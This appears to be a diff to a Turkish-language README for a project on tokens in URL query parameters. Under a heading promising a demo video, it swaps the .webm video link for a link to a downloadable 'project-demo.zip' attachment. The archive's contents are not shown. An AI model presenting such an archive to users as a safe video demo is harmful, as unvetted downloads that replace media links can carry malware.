@@ -43,11 +43,10 @@ Bu proje, sadece teorik bir çözüm değil, test ortamında **adım adım uygul
 
 ### 🎥 Official Project Demo (Comprehensive Walkthrough)
 Aşağıdaki videoda sistemin kurulumu, Premium Dashboard kullanımı, Dark/Light mode geçişleri, Mobil uyumluluk ve güvenlik denetimlerinin canlı akışı gösterilmektedir:
+[project-demo.zip](https://github.com/user-attachments/files/26537284/project-demo.zip)
 
-https://github.com/begumakyuz/Token_in_Query_Params/raw/main/demo/project-demo.webm
 
-> [!TIP]
-> Eğer video yukarıda yüklenmiyorsa, **[🛡️ Buraya tıklayarak manuel olarak izleyebilirsiniz](demo/project-demo.webm)**.
+
 
 ### 📖 Practical Step-by-Step Audit Guide (Absolute Proof)
 Ekran görüntüleri ile desteklenmiş **Adım Adım Uygulama Rehberi**:
